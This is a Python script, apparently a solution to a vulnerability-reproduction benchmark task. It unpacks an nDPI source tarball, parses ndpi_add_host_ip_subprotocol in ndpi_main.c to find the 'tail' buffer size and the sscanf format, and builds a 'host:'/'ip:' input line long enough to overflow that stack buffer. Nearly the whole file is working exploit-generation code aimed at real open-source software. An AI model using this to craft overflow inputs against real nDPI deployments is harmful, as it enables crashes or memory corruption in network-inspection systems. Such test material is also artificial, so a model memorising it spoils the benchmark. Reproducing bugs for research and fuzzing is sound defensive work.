import os
import re
import tarfile
import tempfile
from pathlib import Path
from typing import List, Optional, Tuple


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        base = Path(dst_dir).resolve()
        for m in tf.getmembers():
            name = m.name
            if not name or name == ".":
                continue
            p = (base / name).resolve()
            if not str(p).startswith(str(base) + os.sep) and p != base:
                continue
            if m.issym() or m.islnk():
                continue
            tf.extract(m, dst_dir)


def _find_file(root: str, filename: str) -> Optional[str]:
    for dirpath, _, files in os.walk(root):
        if filename in files:
            return os.path.join(dirpath, filename)
    return None


def _read_text(path: str) -> str:
    with open(path, "rb") as f:
        data = f.read()
    return data.decode("utf-8", errors="ignore")


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    in_str = False
    in_chr = False
    while i < n:
        c = s[i]
        if in_str:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue
        if c == '"':
            in_str = True
            out.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            out.append(c)
            i += 1
            continue
        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                i += 2
                while i < n and s[i] not in "\r\n":
                    i += 1
                continue
            if c2 == "*":
                i += 2
                while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                    i += 1
                i += 2
                continue
        out.append(c)
        i += 1
    return "".join(out)


def _extract_function_body(src: str, func_name: str) -> Optional[str]:
    m = re.search(r'\b' + re.escape(func_name) + r'\s*\((?:.|\n)*?\)\s*{', src)
    if not m:
        return None
    start = m.end() - 1
    i = start
    n = len(src)
    depth = 0
    in_str = False
    in_chr = False
    while i < n:
        c = src[i]
        if in_str:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if c == "\\" and i + 1 < n:
                i += 2
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return src[start:i + 1]
        i += 1
    return None


def _find_tail_decl_size(func_body: str) -> Optional[str]:
    m = re.search(r'\b(?:unsigned\s+)?(?:char|u_char|u_int8_t|uint8_t|int8_t|signed\s+char)\s+tail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', func_body)
    if m:
        return m.group(1)
    m = re.search(r'\b(?:char|u_char|u_int8_t|uint8_t)\s+tail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', func_body)
    if m:
        return m.group(1)
    return None


def _resolve_macro_int(root_texts: List[str], macro: str) -> Optional[int]:
    pat = re.compile(r'^\s*#\s*define\s+' + re.escape(macro) + r'\s+(.+?)\s*(?:/[*].*?[*]/\s*)?$', re.M)
    for txt in root_texts:
        m = pat.search(txt)
        if not m:
            continue
        val = m.group(1).strip()
        val = val.split("//", 1)[0].strip()
        val = re.sub(r'/\*.*?\*/', '', val).strip()
        val = val.strip("()")
        if re.fullmatch(r'\d+', val):
            try:
                return int(val)
            except Exception:
                return None
        m2 = re.fullmatch(r'(\d+)\s*([*+/-])\s*(\d+)', val)
        if m2:
            a = int(m2.group(1))
            b = int(m2.group(3))
            op = m2.group(2)
            try:
                if op == "*":
                    return a * b
                if op == "+":
                    return a + b
                if op == "-":
                    return a - b
                if op == "/":
                    return a // b if b != 0 else None
            except Exception:
                return None
    return None


def _extract_sscanf_call_with_tail(func_body: str) -> Optional[str]:
    s = func_body
    idx = 0
    n = len(s)
    while True:
        j = s.find("sscanf", idx)
        if j < 0:
            return None
        k = j + 6
        while k < n and s[k].isspace():
            k += 1
        if k >= n or s[k] != "(":
            idx = j + 6
            continue
        p = k
        depth = 0
        in_str = False
        in_chr = False
        while p < n:
            c = s[p]
            if in_str:
                if c == "\\" and p + 1 < n:
                    p += 2
                    continue
                if c == '"':
                    in_str = False
                p += 1
                continue
            if in_chr:
                if c == "\\" and p + 1 < n:
                    p += 2
                    continue
                if c == "'":
                    in_chr = False
                p += 1
                continue
            if c == '"':
                in_str = True
                p += 1
                continue
            if c == "'":
                in_chr = True
                p += 1
                continue
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    q = p + 1
                    while q < n and s[q].isspace():
                        q += 1
                    if q < n and s[q] == ";":
                        call = s[j:q + 1]
                    else:
                        call = s[j:p + 1]
                    if re.search(r'\btail\b', call):
                        return call
                    break
            p += 1
        idx = j + 6


def _split_c_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth_par = 0
    depth_br = 0
    depth_cr = 0
    in_str = False
    in_chr = False
    esc = False
    i = 0
    n = len(arg_str)
    while i < n:
        c = arg_str[i]
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            i += 1
            continue
        if c == '"':
            in_str = True
            cur.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            i += 1
            continue
        if c == "(":
            depth_par += 1
        elif c == ")":
            if depth_par > 0:
                depth_par -= 1
        elif c == "[":
            depth_br += 1
        elif c == "]":
            if depth_br > 0:
                depth_br -= 1
        elif c == "{":
            depth_cr += 1
        elif c == "}":
            if depth_cr > 0:
                depth_cr -= 1
        if c == "," and depth_par == 0 and depth_br == 0 and depth_cr == 0:
            a = "".join(cur).strip()
            if a:
                args.append(a)
            cur = []
            i += 1
            continue
        cur.append(c)
        i += 1
    a = "".join(cur).strip()
    if a:
        args.append(a)
    return args


def _parse_c_string_literals(s: str, start_idx: int) -> Tuple[Optional[str], int]:
    i = start_idx
    n = len(s)
    parts = []
    while i < n:
        while i < n and s[i].isspace():
            i += 1
        if i >= n or s[i] != '"':
            break
        i += 1
        out = []
        while i < n:
            c = s[i]
            if c == '"':
                i += 1
                break
            if c == "\\" and i + 1 < n:
                c2 = s[i + 1]
                if c2 in ['\\', '"', "'", "?", "a", "b", "f", "n", "r", "t", "v"]:
                    mapping = {
                        "\\": "\\",
                        '"': '"',
                        "'": "'",
                        "?": "?",
                        "a": "\a",
                        "b": "\b",
                        "f": "\f",
                        "n": "\n",
                        "r": "\r",
                        "t": "\t",
                        "v": "\v",
                    }
                    out.append(mapping.get(c2, c2))
                    i += 2
                    continue
                if c2 == "x":
                    j = i + 2
                    hex_digits = []
                    while j < n and len(hex_digits) < 2 and s[j] in "0123456789abcdefABCDEF":
                        hex_digits.append(s[j])
                        j += 1
                    if hex_digits:
                        out.append(chr(int("".join(hex_digits), 16)))
                        i = j
                        continue
                    out.append("x")
                    i += 2
                    continue
                if c2 in "01234567":
                    j = i + 1
                    oct_digits = []
                    while j < n and len(oct_digits) < 3 and s[j] in "01234567":
                        oct_digits.append(s[j])
                        j += 1
                    if oct_digits:
                        out.append(chr(int("".join(oct_digits), 8)))
                        i = j
                        continue
                out.append(c2)
                i += 2
                continue
            out.append(c)
            i += 1
        parts.append("".join(out))
    if not parts:
        return None, start_idx
    return "".join(parts), i


def _extract_format_string_from_sscanf(call: str) -> Optional[str]:
    p = call.find("(")
    if p < 0:
        return None
    inner = call[p + 1:]
    q = inner.rfind(")")
    if q >= 0:
        inner = inner[:q]
    args = _split_c_args(inner)
    if len(args) < 2:
        return None
    fmt_arg = args[1].strip()
    idx = fmt_arg.find('"')
    if idx < 0:
        return None
    fmt, _ = _parse_c_string_literals(fmt_arg, idx)
    return fmt


def _get_sscanf_args(call: str) -> List[str]:
    p = call.find("(")
    if p < 0:
        return []
    inner = call[p + 1:]
    q = inner.rfind(")")
    if q >= 0:
        inner = inner[:q]
    return _split_c_args(inner)


def _parse_scanset_content(fmt: str, i: int) -> Tuple[str, int]:
    n = len(fmt)
    assert fmt[i] == "["
    i += 1
    start = i
    if i < n and fmt[i] == "]":
        i += 1
    while i < n:
        if fmt[i] == "]":
            return fmt[start:i], i + 1
        i += 1
    return fmt[start:], n


def _scanset_contains(scanset: str, ch: str) -> bool:
    n = len(scanset)
    i = 0
    while i < n:
        c = scanset[i]
        if i + 2 < n and scanset[i + 1] == "-" and scanset[i + 2] != "-":
            a = c
            b = scanset[i + 2]
            if ord(a) <= ord(ch) <= ord(b) or ord(b) <= ord(ch) <= ord(a):
                return True
            i += 3
            continue
        if c == ch:
            return True
        i += 1
    return False


def _choose_char_for_scanset(scanset: str, negated: bool) -> str:
    candidates = ["A", "a", "0", "1", "_", "-", ".", "/", "x", "Z", "9"]
    for c in candidates:
        in_set = _scanset_contains(scanset, c)
        if (not negated and in_set) or (negated and not in_set):
            return c
    return "A" if not negated else "B"


def _parse_scanf_conversions(fmt: str) -> List[Tuple[int, dict]]:
    convs = []
    i = 0
    n = len(fmt)
    arg_idx = 0
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        i += 1
        if i < n and fmt[i] == "%":
            i += 1
            continue
        suppressed = False
        if i < n and fmt[i] == "*":
            suppressed = True
            i += 1
        width = None
        j = i
        while j < n and fmt[j].isdigit():
            j += 1
        if j > i:
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        if i + 1 < n and fmt[i:i + 2] in ("hh", "ll"):
            i += 2
        elif i < n and fmt[i] in ("h", "l", "L", "j", "z", "t"):
            i += 1
        if i >= n:
            break
        conv = fmt[i]
        scanset = None
        neg = False
        if conv == "[":
            scanset_content, ni = _parse_scanset_content(fmt, i)
            conv = "["
            i = ni
            if scanset_content.startswith("^"):
                neg = True
                scanset = scanset_content[1:]
            else:
                scanset = scanset_content
        else:
            i += 1
        consumes = (conv != "%") and (not suppressed)
        if consumes:
            convs.append((arg_idx, {"conv": conv, "width": width, "scanset": scanset, "neg": neg, "suppressed": suppressed}))
            arg_idx += 1
        else:
            if conv == "n" and not suppressed:
                convs.append((arg_idx, {"conv": "n", "width": width, "scanset": None, "neg": False, "suppressed": suppressed}))
                arg_idx += 1
    return convs


def _synthesize_input_from_format(fmt: str, tail_conv_argpos: int, tail_bufsize: int) -> str:
    i = 0
    n = len(fmt)
    argpos = 0
    out = []
    while i < n:
        c = fmt[i]
        if c != "%":
            if c.isspace():
                if not out or out[-1] != " ":
                    out.append(" ")
            else:
                out.append(c)
            i += 1
            continue
        i += 1
        if i < n and fmt[i] == "%":
            out.append("%")
            i += 1
            continue
        suppressed = False
        if i < n and fmt[i] == "*":
            suppressed = True
            i += 1
        width = None
        j = i
        while j < n and fmt[j].isdigit():
            j += 1
        if j > i:
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        if i + 1 < n and fmt[i:i + 2] in ("hh", "ll"):
            i += 2
        elif i < n and fmt[i] in ("h", "l", "L", "j", "z", "t"):
            i += 1
        if i >= n:
            break
        conv = fmt[i]
        scanset = None
        neg = False
        if conv == "[":
            scanset_content, ni = _parse_scanset_content(fmt, i)
            conv = "["
            i = ni
            if scanset_content.startswith("^"):
                neg = True
                scanset = scanset_content[1:]
            else:
                scanset = scanset_content
        else:
            i += 1

        consumes = (conv != "%") and (not suppressed)
        need_emit = True
        token = ""
        if conv == "n":
            need_emit = False
            token = ""
        elif conv in ("d", "i", "u", "o", "x", "X", "p"):
            token = "0"
        elif conv in ("f", "F", "e", "E", "g", "G", "a", "A"):
            token = "0"
        elif conv == "c":
            token = "A"
        elif conv == "s":
            token = "A"
        elif conv == "[":
            ch = _choose_char_for_scanset(scanset or "", neg)
            token = ch
        else:
            token = "0"

        if consumes:
            if argpos == tail_conv_argpos:
                if conv == "[":
                    ch = _choose_char_for_scanset(scanset or "", neg)
                    token = ch * max(1, tail_bufsize)
                else:
                    token = "A" * max(1, tail_bufsize)
            argpos += 1
        else:
            if suppressed:
                if conv == "[":
                    ch = _choose_char_for_scanset(scanset or "", neg)
                    token = ch
                elif conv in ("s", "c"):
                    token = "A"
                else:
                    token = "0"

        if need_emit:
            out.append(token)
    s = "".join(out)
    s = s.replace("\x00", "A")
    return s


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            _safe_extract_tar(src_path, td)

            ndpi_main = _find_file(td, "ndpi_main.c")
            if not ndpi_main:
                return b"host:a@" + (b"A" * 48) + b"\n"

            full = _read_text(ndpi_main)
            full_nc = _strip_c_comments(full)

            body = _extract_function_body(full_nc, "ndpi_add_host_ip_subprotocol")
            if not body:
                return b"host:a@" + (b"A" * 48) + b"\n"

            tail_size_expr = _find_tail_decl_size(body)
            tail_size = None
            if tail_size_expr:
                if tail_size_expr.isdigit():
                    tail_size = int(tail_size_expr)
                else:
                    texts = [full_nc]
                    tail_size = _resolve_macro_int(texts, tail_size_expr)

            if tail_size is None or tail_size <= 0:
                tail_size = 48
            if tail_size > 4096:
                tail_size = 256

            call = _extract_sscanf_call_with_tail(body)
            fmt = _extract_format_string_from_sscanf(call) if call else None

            if not fmt:
                val = "a@" + ("A" * tail_size)
                payload = "host:" + val + "\n"
                return payload.encode("ascii", errors="ignore")

            args = _get_sscanf_args(call) if call else []
            tail_arg_pos = None
            if len(args) >= 3:
                after_fmt = args[2:]
                for i, a in enumerate(after_fmt):
                    if re.search(r'\btail\b', a):
                        tail_arg_pos = i
                        break
            if tail_arg_pos is None:
                tail_arg_pos = 1

            value = _synthesize_input_from_format(fmt, tail_arg_pos, tail_size)

            lines = []
            base = value.strip("\r\n")
            lines.append(base)
            if not (base.startswith("host:") or base.startswith("ip:")):
                lines.append("host:" + base)
                lines.append("ip:" + base)
            out = "\n".join(lines) + "\n"
            return out.encode("ascii", errors="ignore")